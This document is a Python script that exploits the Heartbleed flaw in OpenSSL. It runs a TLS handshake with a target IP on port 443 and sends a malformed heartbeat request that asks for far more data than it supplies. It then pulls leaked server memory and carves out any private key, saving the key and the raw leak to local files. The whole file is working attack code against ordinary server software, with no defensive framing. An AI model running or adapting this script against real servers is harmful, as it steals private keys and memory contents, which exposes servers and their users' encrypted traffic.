#!/usr/bin/env python3
#coding: utf-8
import socket
import struct
import sys

def hex2bin(arr):
    long_hex_string =  ''.join('{:02x}'.format(x) for x in arr)
    return bytes.fromhex(long_hex_string)

'''
	Found this TLS request in the internet
'''

client_tls_hello = [
# TLS header ( 5 bytes)
0x16,               # Content type (0x16 for handshake)
0x03, 0x02,         # TLS Version
0x00, 0xdc,         # Length
# Handshake header
0x01,               # Type (0x01 for ClientHello)
0x00, 0x00, 0xd8,   # Length
0x03, 0x02,         # TLS Version
# Random (32 byte)
0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
0x00,               # Session ID length
0x00, 0x66,         # Cipher suites length
# Cipher suites (51 suites)
0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
0x01,               # Compression methods length
0x00,               # Compression method (0x00 for NULL)
0x00, 0x49,         # Extensions length
# Extension: ec_point_formats
0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
# Extension: elliptic_curves
0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
# Extension: SessionTicket TLS
0x00, 0x23, 0x00, 0x00,
# Extension: Heartbeat
0x00, 0x0f, 0x00, 0x01, 0x01
]

'''
	special heartbeat request to perform heartbleed
'''

heartbeat_request = [
0x18,       # Content Type (Heartbeat)
0x03, 0x02,  # TLS version
0x00, 0x03,  # Length
# Payload
0x01,       # Type (Request)
0x40, 0x00  # Payload length
]

def heartbeat(socket):

    # send heartbeat request to the server
    socket.send(hex2bin(heartbeat_request))

    while True:

        header = socket.recv(5)
        (content_type, version, length) = struct.unpack('>BHH', header)
        # we can't use s.recv(length) because the server can separate the packet heartbeat into different smaller packet
        pay = recvall(socket,length)
        if pay is None:
            print('Unexpected EOF receiving record payload - server closed connection')
            return False

        # heartbeat content type is 24 check rfc6520
        if content_type == 24:
            #if size is bigger than the requested
            if len(pay) > 3:
                print ('WARNING: server returned more data than it should - server is vulnerable!')
                if b'END PRIVATE KEY' in pay:
                    print('Found private key')
                    str_pay = str(pay)
                    key_header = '-----BEGIN PRIVATE KEY-----'
                    key_footer = '-----END PRIVATE KEY-----'
                    start = str_pay.find(key_header)
                    end = str_pay.find(key_footer) + len(key_footer)
                    private_key = str_pay[start:end]
                    private_key = key_header + '\n' + private_key[private_key.find(key_header) + len(key_header) : private_key.find(key_footer)] + '\n' + key_footer
                    f = open("private_key.txt", "w+")
                    f.write(private_key)
                    f.close()
                    f = open("leaked_data.txt", "w+")
                    f.write(str_pay)
                    f.close()
                    print(private_key)
                    print('the private key was writen to file \'private_key.txt\' and the whole leaked data to \'leaked_data.txt\'')
            else:
                print('Server processed but did not return extra data.')
            return True


    return False


"""from https://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data """
def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


ip = sys.argv[-1]
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((ip, 443))

socket.send(hex2bin(client_tls_hello))
# after handshake
while True:
    header = socket.recv(5)
    (content_type, version, length) = struct.unpack('>BHH', header)
    handshake = recvall(socket, length)
    # Look for server hello done message.
    if content_type == 22 and handshake[0] == 0x0E:
        break

print('Handshake ok')
print('Sending  especial heartbeat')
heartbeat(socket)
socket.close()
